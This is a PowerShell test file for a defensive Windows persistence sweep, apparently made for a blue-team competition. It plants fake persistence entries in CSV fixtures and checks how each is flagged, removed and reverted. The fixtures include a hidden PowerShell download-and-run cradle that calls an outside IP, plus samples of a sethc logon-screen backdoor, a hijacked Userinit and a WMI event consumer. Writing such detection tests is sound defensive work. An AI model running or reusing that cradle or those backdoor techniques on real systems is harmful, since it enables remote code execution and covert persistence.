# =============================================================================
# Tests for WN-42 Windows persistence sweep.
#   pwsh -NoProfile -File tests/wn42.Tests.ps1
#
# Stand-in state ($env:BT_WN42_FAKE): one CSV per area (id, name, run,
# extra, state) with planted persistence - a task that downloads and runs, a
# Run value in AppData, a startup script, a changed Winlogon Userinit, a
# service from a temp folder, a WMI subscription, a debugger on notepad and on
# sethc (WN-43's), an extra local admin - beside harmless Windows items that
# must stay quiet.  Checks: each finding and its level; the defaults; a dry
# run changes nothing; -Apply removes exactly what was chosen; revert.ps1
# puts it back; -Areas, -Exclude, the protected list; the questions.
# =============================================================================
$ErrorActionPreference = 'Stop'
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$root = Split-Path -Parent $here
$wn42 = Join-Path (Join-Path (Join-Path $root 'roles') 'windows-ad') 'WN-42-persistence-sweep.ps1'
$psExe = (Get-Process -Id $PID).Path
$tmp = Join-Path ([IO.Path]::GetTempPath()) ('cctest_wn42_' + $PID)
$out = Join-Path $tmp 'out'
$fake = Join-Path $tmp 'state'
New-Item -ItemType Directory -Path $fake -Force | Out-Null
$env:BT_SKIP_VERIFY = '1'; $env:BT_WN42_FAKE = $fake
$script:pass = 0; $script:fail = 0
function T-Start($t) { Write-Host "  -- $t" }
function T-Eq($got, $want, $label) { if ("$got" -ceq "$want") { $script:pass++ } else { $script:fail++; Write-Host "     FAIL: $label"; Write-Host "           got [$got], wanted [$want]" } }
function T-True($cond, $label) { if ($cond) { $script:pass++ } else { $script:fail++; Write-Host "     FAIL: $label" } }
function T-Has($text, $needle, $label) { T-True ("$text".Contains($needle)) "$label (missing [$needle])" }
function T-HasNot($text, $needle, $label) { T-True (-not "$text".Contains($needle)) "$label (found [$needle])" }
function Run([string[]]$a) {
    $all = @('-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-File', $wn42) + @($a)
    $text = (& $psExe @all 2>&1 | Out-String)
    $dir = ''; if ($text -match 'All results: (\S+)') { $dir = $matches[1].Trim() }
    return @{ Code = $LASTEXITCODE; Text = $text; Dir = $dir }
}
function State($area, $id) { foreach ($r in @(Import-Csv -LiteralPath (Join-Path $fake ($area + '.csv')))) { if ($r.id -eq $id) { return $r.state } }; return '(none)' }
function W($area, [string[]]$rows) { [IO.File]::WriteAllLines((Join-Path $fake ($area + '.csv')), [string[]](@('"id","name","run","extra","state"') + $rows)) }
function Plant {
    $dl = 'powershell.exe -w hidden -c "IEX (New-Object Net.WebClient).Download' + 'String(''http://10.6.6.6/a'')"'
    W 'tasks' @(
        ('"\Microsoft\Windows\Defrag\ScheduledDefrag","\Microsoft\Windows\Defrag\ScheduledDefrag","%windir%\system32\defrag.exe -c","Microsoft","on"'),
        ('"\Updater","\Updater","' + $dl.Replace('"', '""') + '","admin","on"'),
        ('"\Backup","\Backup","C:\Tools\backup.exe /quick","IT","on"'))
    W 'runkeys' @(
        '"HKLM|SecurityHealth","SecurityHealth  (HKLM\...\Run)","C:\Windows\system32\SecurityHealthSystray.exe","HKLM","on"',
        '"HKCU|OneDriveSync","OneDriveSync  (HKCU\...\Run)","C:\Users\bob\AppData\Roaming\sync\svc.exe","HKCU","on"')
    W 'startup' @('"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\update.vbs","C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\update.vbs","C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\update.vbs","","on"')
    W 'winlogon' @('"Userinit","Userinit","C:\Windows\system32\userinit.exe,C:\Windows\Temp\x.exe","","on"', '"Shell","Shell","explorer.exe","","on"')
    W 'services' @('"Spooler","Spooler (Print Spooler)","C:\Windows\System32\spoolsv.exe","Auto|Running","on"', '"WinUpdSvc","WinUpdSvc (Windows Update Helper)","C:\Windows\Temp\upd.exe","Auto|Running","on"', '"W3SVC","W3SVC (World Wide Web Publishing Service)","C:\Windows\system32\svchost.exe -k iissvcs","Auto|Running","on"')
    W 'wmi' @('"wmi-1","CommandLineEventConsumer.Name=""BVTConsumer"" <- __EventFilter.Name=""BVTFilter""","cmd.exe /c C:\Users\Public\b.bat","f|c","on"')
    W 'ifeo' @('"notepad.exe","notepad.exe","C:\Windows\Temp\np.exe","","on"', '"sethc.exe","sethc.exe","cmd.exe","","on"')
    W 'admins' @('"Administrators|HOST\Administrator","HOST\Administrator in Administrators","","S-1-5-21-1-500","on"', '"Administrators|HOST\helpdesk","HOST\helpdesk in Administrators","","S-1-5-21-1-1005","on"', '"Remote Desktop Users|HOST\scorer","HOST\scorer in Remote Desktop Users","","S-1-5-21-1-1006","on"')
}
$prot = Join-Path $tmp 'protected.txt'
[IO.File]::WriteAllLines($prot, [string[]]@('account scorer the scoring engine logs in by RDP', 'service W3SVC scored web'))

T-Start 'options'
$r = Run @('-Out', $out, '-Areas', 'everything'); T-Eq $r.Code 2 'an unknown area exits 2'
$r = Run @('-Out', $out, '-Timer', '5'); T-Eq $r.Code 2 '-Timer under 30 exits 2'

T-Start 'find (dry run, -Batch)'
Plant; $before = (Get-ChildItem -LiteralPath $fake | ForEach-Object { [IO.File]::ReadAllText($_.FullName) }) -join ''
$r = Run @('-Out', $out, '-Protected', $prot, '-Batch')
T-Eq $r.Code 0 'exit 0'
T-Has $r.Text 'WN-42 Windows persistence sweep | host' 'the title line'
T-Has $r.Text '[?] Which areas to look in? [A/q] a (default): all of them' 'the areas question'
T-Has $r.Text 'HIGH tasks: \Updater - download-and-run or hidden code' 'a download-and-run task is HIGH'
T-Has $r.Text 'LOW  tasks: \Backup - not one of Windows'' own tasks' 'a non-Windows task is listed LOW'
T-HasNot $r.Text 'ScheduledDefrag' 'Windows'' own tasks stay quiet'
T-Has $r.Text 'HIGH runkeys: OneDriveSync' 'a Run value from AppData is HIGH'
T-Has $r.Text 'LOW  runkeys: SecurityHealth' 'a normal Run value is LOW'
T-Has $r.Text 'MED  startup:' 'a startup script is MED'
T-Has $r.Text 'HIGH winlogon: Userinit - changed from Windows'' own' 'a changed Userinit is HIGH'
T-HasNot $r.Text 'winlogon: Shell' 'an unchanged Shell stays quiet'
T-Has $r.Text 'HIGH services: WinUpdSvc' 'a service from Temp is HIGH'
T-HasNot $r.Text 'services: Spooler' 'a normal service stays quiet'
T-Has $r.Text 'HIGH wmi:' 'a WMI subscription is HIGH'
T-Has $r.Text 'HIGH ifeo: notepad.exe - runs instead of notepad.exe' 'a debugger on notepad is HIGH'
T-Has $r.Text 'sethc.exe runs cmd.exe instead (a logon-screen backdoor): WN-43 removes it' 'sethc is WN-43''s'
T-Has $r.Text 'MED  admins: HOST\helpdesk in Administrators' 'an extra local admin is MED'
T-HasNot $r.Text 'HOST\Administrator in Administrators -' 'the built-in Administrator is left out'
T-Has $r.Text 'HOST\scorer in Remote Desktop Users - left (protected list)' 'a protected account is left'
T-Has $r.Text 'runs: powershell.exe -w hidden' 'what it runs is shown'
T-Has $r.Text 'tasks: \Updater -> remove (default)' 'HIGH defaults to remove'
T-Has $r.Text 'admins: HOST\helpdesk in Administrators -> keep (default)' 'MED defaults to keep'
T-Has $r.Text 'Dry run: nothing was changed' 'a dry run'
$after = (Get-ChildItem -LiteralPath $fake | ForEach-Object { [IO.File]::ReadAllText($_.FullName) }) -join ''
T-Eq $after $before 'and nothing changed'
T-True ($r.Dir -match 'persistence-\d+$') 'a numbered persistence-N folder'
T-True (@(Get-ChildItem -LiteralPath $r.Dir -Recurse -Filter '*.csv').Count -eq 0) 'no CSV in the results'

T-Start 'apply the defaults, then revert'
Plant
$env:BT_TEST_SCHTASKS = Join-Path $tmp 'schtasks.log'
$r = Run @('-Out', $out, '-Protected', $prot, '-Batch', '-Apply')
T-Eq $r.Code 0 'exit 0'
T-Eq (State 'tasks' '\Updater') 'off' 'the task is disabled'
T-Eq (State 'tasks' '\Backup') 'on' 'a LOW one is not touched'
T-Eq (State 'runkeys' 'HKCU|OneDriveSync') 'off' 'the Run value is removed'
T-Eq (State 'winlogon' 'Userinit') 'off' 'Userinit is set back'
T-Eq (State 'services' 'WinUpdSvc') 'off' 'the service is disabled'
T-Eq (State 'services' 'W3SVC') 'on' 'a protected service is never touched'
T-Eq (State 'wmi' 'wmi-1') 'off' 'the WMI binding is removed'
T-Eq (State 'ifeo' 'notepad.exe') 'off' 'the debugger is removed'
T-Eq (State 'ifeo' 'sethc.exe') 'on' 'sethc is left to WN-43'
T-Eq (State 'startup' 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\update.vbs') 'on' 'MED startup script kept by default'
T-Eq (State 'admins' 'Administrators|HOST\helpdesk') 'on' 'MED admin kept by default'
T-Has $r.Text 'Changes kept (-Batch)' '-Batch keeps the changes after the timer question'
& $psExe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File (Join-Path $r.Dir 'revert.ps1') -Force 2>&1 | Out-Null
T-Eq (State 'tasks' '\Updater') 'on' 'revert.ps1 puts the task back'
T-Eq (State 'wmi' 'wmi-1') 'on' 'and the WMI binding'
Remove-Item Env:\BT_TEST_SCHTASKS

T-Start '-Areas, -Exclude and the questions'
Plant
$r = Run @('-Out', $out, '-Protected', $prot, '-Batch', '-Areas', 'wmi,ifeo')
T-HasNot $r.Text 'tasks:' '-Areas: only those areas'
T-Has $r.Text 'HIGH wmi:' 'wmi is looked at'
$r = Run @('-Out', $out, '-Protected', $prot, '-Batch', '-Areas', 'tasks', '-Exclude', 'updater')
T-Has $r.Text 'tasks: \Updater - left (-Exclude)' '-Exclude leaves a name alone'
# q: quick areas; HIGH order by area: ... runkeys OneDriveSync (k), services WinUpdSvc (r), then a; apply y; keep y
Plant
$env:BT_TEST_SCHTASKS = Join-Path $tmp 'schtasks2.log'
$env:BT_TEST_ANSWERS = 'q;k;r;a;y;y'
$r = Run @('-Out', $out, '-Protected', $prot)
Remove-Item Env:\BT_TEST_ANSWERS; Remove-Item Env:\BT_TEST_SCHTASKS
T-Has $r.Text '[r] remove:' 'each finding lists its answers'
T-HasNot $r.Text 'winlogon:' 'q: the quick areas only'
T-Eq (State 'runkeys' 'HKCU|OneDriveSync') 'on' 'k: kept'
T-Eq (State 'services' 'WinUpdSvc') 'off' 'r: removed'
T-Eq (State 'tasks' '\Updater') 'off' 'a: the rest take their default'
T-Has $r.Text 'Changes kept' 'keep: y'

Remove-Item -LiteralPath $tmp -Recurse -Force -ErrorAction SilentlyContinue
Write-Host ("  {0} passed, {1} failed" -f $script:pass, $script:fail)
if ($script:fail -gt 0) { exit 1 }
exit 0
